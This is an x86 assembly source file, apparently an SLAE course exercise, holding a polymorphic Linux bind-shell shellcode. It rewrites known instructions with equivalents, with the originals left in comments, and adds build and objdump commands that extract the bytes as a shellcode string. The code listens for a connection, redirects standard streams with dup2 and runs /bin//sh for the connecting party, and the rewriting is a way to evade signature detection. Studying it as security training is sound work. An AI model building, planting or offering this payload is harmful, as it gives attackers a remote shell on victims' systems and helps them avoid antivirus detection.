; Filename:      shellcode-polymorphic-asm.nasm
; Author:        Nicolas BarriÃ¨re
; Student ID:    SLAE - 1398
; Created Date:  26.12.2018
; Assembler:     nasm -f elf32 shellcode-polymorphic-asm.nasm -o shellcode-polymorphic-asm.o
; Linker:        ld -N -m elf_i386 shellcode-polymorphic-asm.o -o shellcode-polymorphic-asm
; Assembly dump: objdump -d ./shellcode-polymorphic-asm|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start

section .text

_start:
; xor    ebx,ebx
; mul    ebx
  xor eax, eax
  mov ebx, eax
  mov edx, ebx
  mov ebp, edx                ;Clear ebp
  add bp, 0x66                ;Set ebp to 0x66
; mov    al,0x66
  mov eax, ebp                ;Use ebp to set eax
; inc    ebx
  add ebx , 0x1
  push edx
  push ebx
; push   0x2
  push 0x1
  add byte [esp], 0x1
  mov ecx,esp
  int 0x80                    ;sys_socketcall (SYS_SOCKET)

  push   edx
  push   eax
  mov    ecx,esp
; mov    al,0x66
  mov eax, ebp                ;Use ebp to set eax
; mov    bl,0x4
  inc ebx
  inc ebx
  inc ebx
  int    0x80                 ;sys_socketcall (SYS_LISTEN)

; mov    al,0x66
  mov eax, ebp                ;Use ebp to set eax
; inc    ebx
  add ebx,0x1
  int    0x80                 ;sys_socketcall (SYS_ACCEPT)

  pop    ecx
  xchg   ebx,eax
  sub ebp, 0x27               ;Set ebp to 0x3f

label:

; push   0x3f
; pop    eax
  mov eax, ebp                ;Use ebp to set eax
  int    0x80                 ;sys_dup2

; dec    ecx
  sub ecx, 0x1
  jns    label

; mov    al,0xb
  sub ebp, 0x34               ;Set ebp to 0xb
  mov eax, ebp                ;Use ebp to set eax
  push   0x68732f2f
  push   0x6e69622f
  mov    ebx,esp
; inc    ecx
  add ecx, 0x1
  int    0x80                  ;execve shell
